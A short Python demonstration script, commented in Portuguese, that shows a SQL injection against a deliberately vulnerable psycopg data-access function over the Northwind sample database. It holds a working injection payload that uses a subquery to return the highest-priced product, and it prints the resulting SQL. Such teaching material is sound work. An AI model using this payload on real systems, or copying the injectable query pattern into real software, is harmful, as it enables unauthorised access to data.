from app.dao.vulnerable_psycopg import (
    find_product_id_and_price_by_name,
)

def demonstrar_sql_injection():
    """
    Demonstra diferentes vetores de SQL Injection nas funções vulneráveis
    """
    
    # Injection em pesquisa de produto
    print("=== SQL Injection na busca de produto ===")

    entrada_maliciosa_produto = "' OR unitprice = (SELECT MAX(unitprice) FROM northwind.products) --"
    
    print(f"Busca com SQL Injection: ({entrada_maliciosa_produto})")
    
    print("SQL executado: SELECT productid, unitprice FROM northwind.products WHERE productname = '' OR unitprice = (SELECT MAX(unitprice) FROM northwind.products) --'")
    print("O comando acima retorna o produto com o maior preço devido à subconsulta")

    product_info = find_product_id_and_price_by_name(entrada_maliciosa_produto)
    print(f"Resultado: {product_info} (produto mais caro da tabela)")
    